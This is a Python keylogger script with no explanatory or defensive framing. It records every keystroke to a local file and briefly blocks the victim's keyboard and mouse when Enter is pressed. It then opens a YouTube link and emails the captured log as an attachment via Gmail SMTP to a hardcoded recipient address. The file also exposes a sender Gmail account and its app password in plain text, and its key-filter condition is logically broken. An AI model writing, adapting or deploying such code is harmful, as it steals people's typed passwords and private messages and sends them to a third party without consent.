from pynput.keyboard import Key, Listener
import yagmail
import mouse
import os
import time
import pyautogui
from threading import Thread
from keyboard import block_key
count = 0
keys = []
while(True):
    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1
        print("{0}".format(str(key)))
        if ("{0}".format(str(key))) == '<96>' or '<97>' or '<98>' or '<99>' or '<100>' or '<101>' or '<102>' or '<103>' or '<104>' or '<105>' or '0' or '1' or '2' or '3' or '4' or '5' or '6' or '7' or '8' or '9':
            if count >= 1:
                write_file(keys)
                keys = []
                count = 0
    def write_file(keys):
        with open("logs.txt", "a", encoding="utf-8") as file:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write("\n")
                elif k.find("Key"):
                    file.write(str(k))
    def on_release(key):
        if key == Key.enter:
            def blockMouseAndKeys(timeout=30):
                global blocking
                blockStartTime = time.time()
                pyautogui.FAILSAFE = False
                blocking = True
                try:
                    float(timeout)
                except:
                    timeout = 30

                def blockKeys(timeout):
                    global blocking
                    while blocking:
                        if timeout:
                            if time.time() - blockStartTime > timeout:
                                print(f'Keyboard block timed out after {timeout}s.')
                                return
                        for i in range(150):
                            try:
                                block_key(i)
                            except:
                                pass

                def blockMouse(timeout):
                    global blocking
                    while blocking:
                        def resetMouse():
                            mouse.move(1, 0, absolute=True, duration=0)

                        Thread(target=resetMouse).start()
                        if timeout:
                            if time.time() - blockStartTime > timeout:
                                print(f'Mouse block timed out after {timeout}s.')
                                return

                def blockTimeout(timeout):
                    global blocking
                    time.sleep(timeout)
                    blocking = False
                    pyautogui.FAILSAFE = False
                    print('Done blocking inputs!')

                print('Blocking inputs...')
                Thread(target=blockKeys, args=[timeout]).start()
                Thread(target=blockMouse, args=[timeout]).start()
                Thread(target=blockTimeout, args=[timeout]).start()

            blockMouseAndKeys(timeout=5)
            os.startfile('https://www.youtube.com/watch?v=MBKRhmdbZVw')
            return False
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        user = "mertler123mertler@gmail.com"
        password = "mxpozmaguzdmzqbg"
        recipient = "maxm.alnaser123@gmail.com"
        baslik = "başlığımın test edilmesi"
        body = "proje"
        eklentiler = "logs.txt"
        yag = yagmail.SMTP(user=user, password=password, ).send(to=recipient, subject=baslik, contents=body, attachments=eklentiler)

